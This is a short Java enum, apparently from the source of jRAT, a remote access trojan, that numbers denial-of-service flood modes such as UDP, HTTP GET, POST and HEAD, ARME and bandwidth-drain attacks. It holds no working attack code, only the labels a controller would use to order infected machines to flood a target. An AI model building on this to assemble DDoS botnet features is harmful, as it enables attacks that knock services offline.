package su.jrat.common;

public enum Flood {

	NONE(-1),
	UDP(0),
	RAPID(1),
	GET(2),
	POST(3),
	ARME(4),
	DRAIN(5),
	HEAD(6);

	private final int i;

	private Flood(int i) {
		this.i = i;
	}

	public int getNumeric() {
		return this.i;
	}

	public static Flood fromInt(int numeric) {
		for (Flood flood : Flood.values()) {
			if (flood.getNumeric() == numeric) {
				return flood;
			}
		}

		return null;
	}
}
